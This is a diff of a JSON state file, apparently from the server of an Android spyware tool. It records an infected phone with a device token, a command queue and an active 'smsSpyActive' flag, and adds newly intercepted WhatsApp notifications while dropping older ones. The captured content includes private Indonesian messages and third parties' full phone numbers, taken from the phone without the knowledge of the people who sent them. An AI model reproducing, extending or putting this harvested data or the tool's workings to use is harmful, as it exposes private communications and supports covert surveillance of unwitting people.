@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776892209641,
+    "lastSeen": 1776892233375,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 37 chat",
+        "time": "23/04 05:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776892233558
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "23/04 05:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776892233547
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "22/04 16:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1776848220273
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Dedy Hk",
-        "content": "Login",
-        "time": "22/04 16:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776848220185
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 877-1964-4174",
-        "content": "Mau punya website layanan SMM sendiri seperti Mirai-Pedia.com? Kami membuka layanan sewa Child Panel untuk Anda yang ingin mulai berjualan layanan media sosial dengan brand sendiri.\n\nBiaya Sewa:\n\nRp 60.000 / Bulan\n(Harga belum termasuk biaya domain. Domain wajib beli sendiri atau sudah tersedia).\n\nFitur & Sistem:\n\n- Full Brand Sendiri: Kelola website dengan nama dan logo pilihan Anda.\n- Sistem Child Panel: Stok layanan otomatis mengambil dari pusat (Mirai Pedia) via API.\n- Markup Harga: Anda bebas menentukan harga jual dan mengambil keuntungan sendiri.\n- Manajemen Member: Kelola pendaftaran member dan deposit secara mandiri.\n\nSyarat & Ketentuan (Wajib Baca):\n\n- Pahami Sistem: Kami hanya melayani penyewa yang sudah paham cara kerja SMM Panel (alur API, deposit pusat, dan operasional dasar). Pelajari sistem detailnya di sini: https://gemini.google.com/share/9e810b014213\n- Modal Saldo: Ingat bahwa setiap pesanan dari member Anda akan memotong saldo pusat Anda di Mirai Pedia. Anda wajib memiliki deposit di pu…",
-        "time": "22/04 16:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776848213133
       }
     ],
     "galleryPhotos": [],
